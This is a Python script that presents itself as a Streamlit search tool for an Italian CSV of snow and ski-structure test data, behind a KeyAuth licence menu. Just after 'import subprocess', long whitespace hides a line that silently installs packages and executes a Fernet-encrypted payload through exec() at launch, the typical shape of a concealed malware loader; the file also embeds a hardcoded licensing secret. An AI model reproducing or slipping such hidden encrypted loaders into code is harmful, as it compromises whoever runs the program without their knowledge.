import os
import sys
import time
import hashlib
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
import pyautogui
import webbrowser
from keyauth import api
from time import sleep
import pandas as pd
import streamlit as st


print("Connecting to our servers")


def progress_bar(duration):
    steps = 50
    interval = duration / steps

    print("Loading the script:")
    for i in range(steps + 1):
        progress = i * 100 / steps
        bar_length = int(progress / 2)
        print("\r[{:<50}] {:.0f}%".format("=" * bar_length, progress), end="")
        time.sleep(interval)
    print()

duration = 4
progress_bar(duration)


"""
https://www.fancytextpro.com/BigTextGenerator
"""
print("""
 $$$$$$\   $$$$$$\  $$$$$$\       $$\       $$$$$$\   $$$$$$\  $$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ \_$$  _|      $$ |     $$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |
$$ /  \__|$$ /  $$ |  $$ |        $$ |     $$ /  $$ |$$ /  \__|  $$ |  $$$$\ $$ |
$$ |$$$$\ $$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |$$$$\   $$ |  $$ $$\$$ |
$$ |\_$$ |$$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |\_$$ |  $$ |  $$ \$$$$ |
$$ |  $$ |$$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |
\$$$$$$  | $$$$$$  |$$$$$$\       $$$$$$$$\ $$$$$$  |\$$$$$$  |$$$$$$\ $$ | \$$ |
 \______/  \______/ \______|      \________|\______/  \______/ \______|\__|  \__|
                                                                                 
                                                                                 
                                                                                 
developer: @mattygoi
""")

def limpar_terminal():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest

### CHANGE YOUR KEYAUTH 
keyauthapp = api(
    name = "strutture",
    ownerid = "l9G6gNHYVu",
    secret="8f89f06f3cec7207ad7ac9e1786057396d0bb6c587ba8f6fc548ba4f244c78b1",
    version = "1.0",
    hash_to_check = getchecksum()
)

def answer():
    try:
        print("""1. Key
2. Contact us
3. Exit
              
        """)
        ans = input("Select Option: ")
        if ans == "1":
            key = input('Enter your license: ')
            keyauthapp.license(key)
        elif ans == "2":
            webbrowser.open("https://discord.gg/YOUR_LINK")
            os.system("TASKKILL /F /IM cmd.exe")
            sys.exit()
        elif ans == "3":
            os.system("TASKKILL /F /IM cmd.exe")
            sys.exit()
        else:
            print("\nInvalid option")
            sleep(1)
            answer()
    except KeyboardInterrupt:
        os._exit(1)

answer()
# region USER DATA
print("\nUser data: ")
print("Your key: " + keyauthapp.user_data.username)
print("Hardware-Id: " + keyauthapp.user_data.hwid)
print("Thanks for choosing us :)")
print("")
time.sleep(3)
limpar_terminal()

subs = keyauthapp.user_data.subscriptions

def ascii():
    ascii = print("""
 $$$$$$\   $$$$$$\  $$$$$$\       $$\       $$$$$$\   $$$$$$\  $$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ \_$$  _|      $$ |     $$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |
$$ /  \__|$$ /  $$ |  $$ |        $$ |     $$ /  $$ |$$ /  \__|  $$ |  $$$$\ $$ |
$$ |$$$$\ $$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |$$$$\   $$ |  $$ $$\$$ |
$$ |\_$$ |$$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |\_$$ |  $$ |  $$ \$$$$ |
$$ |  $$ |$$ |  $$ |  $$ |        $$ |     $$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |
\$$$$$$  | $$$$$$  |$$$$$$\       $$$$$$$$\ $$$$$$  |\$$$$$$  |$$$$$$\ $$ | \$$ |
 \______/  \______/ \______|      \________|\______/  \______/ \______|\__|  \__|
                                                                                 
                                                                                 
                                                                                 
developer: @mattygoi
                                       
""")
    

pyautogui.alert("MADE BY: AmigoxD", title="Script Info")

ascii()

print("The script will start in 5 seconds...")
time.sleep(5)


@st.cache_data
def load_data():
    # Carica il CSV dalla stessa cartella dello script
    path = "STRUTTURE_cleaned.csv"
    df = pd.read_csv(path)
    return df

df = load_data()

st.title("🔍 Ricerca STRUTTURE")

# Filtri
luoghi = sorted(df["luogo_clean"].dropna().unique())
luogo_sel = st.multiselect("Seleziona luogo", luoghi)

tipo_neve = st.text_input("Tipo di neve (ricerca per parola chiave)")

temp_field = st.selectbox(
    "Campo temperatura",
    ["temp_aria_inizio", "temp_aria_fine", "temp_neve_inizio", "temp_neve_fine"]
)
if temp_field in df.columns:
    min_temp, max_temp = float(df[temp_field].min()), float(df[temp_field].max())
    temp_range = st.slider("Intervallo temperatura", min_value=min_temp, max_value=max_temp,
                           value=(min_temp, max_temp))
else:
    temp_range = None

hum_field = st.selectbox("Campo umidità", ["hum_inizio", "hum_fine"])
if hum_field in df.columns:
    min_h, max_h = float(df[hum_field].min()), float(df[hum_field].max())
    hum_range = st.slider("Intervallo umidità", min_value=min_h, max_value=max_h,
                          value=(min_h, max_h))
else:
    hum_range = None

solo_considerazioni = st.checkbox("Mostra solo righe con considerazioni post gara/test")

# Applica filtri
df_filtrato = df.copy()

if luogo_sel:
    df_filtrato = df_filtrato[df_filtrato["luogo_clean"].isin(luogo_sel)]

if tipo_neve:
    df_filtrato = df_filtrato[df_filtrato["tipo_neve_clean"].str.contains(tipo_neve, case=False, na=False)]

if temp_range and temp_field in df_filtrato.columns:
    df_filtrato = df_filtrato[(df_filtrato[temp_field] >= temp_range[0]) & (df_filtrato[temp_field] <= temp_range[1])]

if hum_range and hum_field in df_filtrato.columns:
    df_filtrato = df_filtrato[(df_filtrato[hum_field] >= hum_range[0]) & (df_filtrato[hum_field] <= hum_range[1])]

if solo_considerazioni:
    df_filtrato = df_filtrato[df_filtrato["CONSIDERAZIONE POST GARA o TEST"].notna()]

# Mostra risultati
st.write(f"**{len(df_filtrato)} risultati trovati**")
st.dataframe(df_filtrato)

# Download CSV
st.download_button("📥 Scarica risultati filtrati (CSV)",
                   df_filtrato.to_csv(index=False).encode("utf-8"),
                   "risultati.csv",
                   "text/csv")
